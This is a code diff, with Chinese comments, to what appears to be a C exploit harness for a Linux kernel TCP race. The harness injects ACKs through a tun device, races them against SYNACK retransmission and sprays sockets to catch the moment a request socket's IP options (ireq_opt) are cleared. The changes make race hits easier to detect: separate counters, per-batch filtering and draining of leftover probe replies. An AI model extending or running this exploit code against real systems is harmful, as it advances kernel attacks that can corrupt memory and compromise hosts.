@@ -133,6 +133,11 @@ static volatile unsigned g_head, g_tail;
 static pthread_mutex_t g_ring_lock = PTHREAD_MUTEX_INITIALIZER;
 static volatile int g_running = 1;
 static volatile unsigned long g_tx, g_rx, g_synack, g_hit, g_clear, g_none;
+/* clear 分两处来源，必须分开统计：
+ *   g_clear_first —— 首次 SYNACK 的 optlen 就是 0（请求 sock 建起来时
+ *                    ireq_opt 已空，和竞态无关）；
+ *   g_clear_race  —— 注入 ACK 之后收到的 optlen=0（这才是竞态撞上的证据）。 */
+static volatile unsigned long g_clear_first, g_clear_race;
 /* 诊断用：凡是能从 tun 读到的包都计进 raw_rx，不管匹配不匹配。
  * raw_rx=0 说明包根本没回到 tun（投递方向或路由有问题），
  * raw_rx>0 但 synack=0 说明回来了但被过滤掉了 —— 两种故障完全不同。 */
@@ -1468,6 +1473,7 @@ static int race_batch(struct race_slot *slots, int want, struct synack *out) {
         g_synack++;
         if (s.optlen == 0) {
             g_clear++;
+            g_clear_first++;
             /* optlen=0 有两种来源，必须分开：
              *   · 首次 SYNACK 就为 0 —— 说明请求 sock 建起来时 ireq_opt
              *     已经是空的，和竞态无关（多半是喷淋的 socket 把端口占了，
@@ -1528,14 +1534,25 @@ static int race_batch(struct race_slot *slots, int want, struct synack *out) {
         usleep(1000);
     }
 
-    /* 收这一批的回包。 */
+    /* 收这一批的回包，只认本批的四元组。
+     *
+     * 之前是把环形缓冲里所有包都弹出来判断，任何别的来源（上一批的残留、
+     * 探针的残留、或者上一轮 accept 掉但还在飞的包）都会被算进 clear/hit。
+     * 现在先按 peer 端口匹配本批的 slots，不属于这批的直接丢掉。 */
     for (;;) {
         pthread_mutex_lock(&g_ring_lock);
         struct synack s;
         int got = pop(&s);
         pthread_mutex_unlock(&g_ring_lock);
         if (!got) break;
-        if (s.optlen == 0) { g_clear++; continue; }
+
+        int mine = 0;
+        for (int i = 0; i < n; i++) {
+            if (slots[i].sport == s.peer) { mine = 1; break; }
+        }
+        if (!mine) continue;          /* 不是本批的，丢掉 */
+
+        if (s.optlen == 0) { g_clear++; g_clear_race++; continue; }
         if (s.optlen == (uint8_t)g_optlen) continue;
         g_hit++;
         *out = s;
@@ -1682,6 +1699,29 @@ static int phase_race(struct hit_ctx *hit) {
         say("[cpu] 在线核心 %ld 个（未绑核，靠调度器分散）",
             ncpu > 0 ? ncpu : 1);
     }
+    /* 把前面各阶段留下的回包清干净。
+     *
+     * [aq] / [ctrl] 那几个探针发的 SYN 会留下 SYNACK，它们还躺在环形缓冲里。
+     * 不清的话，race_batch 会把这些残留包弹出来，optlen=0 的那种还会被
+     * 记进 g_clear —— 日志里 clear 恒定是 12 这种「太整齐」的数字，
+     * 很可能就是探针残留而不是竞态结果。 */
+    {
+        int junk = 0;
+        for (;;) {
+            pthread_mutex_lock(&g_ring_lock);
+            struct synack tmp;
+            int got = pop(&tmp);
+            pthread_mutex_unlock(&g_ring_lock);
+            if (!got) break;
+            junk++;
+        }
+        if (junk > 0) say("[race] 起跑前清掉 %d 个残留回包", junk);
+        g_clear = 0;
+        g_clear_first = 0;
+        g_clear_race = 0;
+        g_mismatch = 0;
+    }
+
     say("开始竞态：每批 %d 个四元组并行，最多 %d 批（每批等一次重传定时器）",
         RACE_BATCH, g_rounds);
     spray_start();
@@ -2069,6 +2109,8 @@ int main(int argc, char **argv) {
     say("      回到 tun 的 TCP=%lu RST=%lu 对不上的 SYNACK=%lu",
         g_tcp_other, g_rst_seen, g_mismatch);
     say("      回给我们端口的 TCP=%lu（其中 RST %lu）", g_tcp_other_to_us, g_rst_to_us);
+    say("      clear 细分：首次就没有选项=%lu，注入 ACK 后变空=%lu",
+        g_clear_first, g_clear_race);
     say("      ICMP: echo-reply=%lu param-problem=%lu unreach=%lu",
         g_icmp_echo_reply, g_icmp_param_prob, g_icmp_unreach);
     g_running = 0;
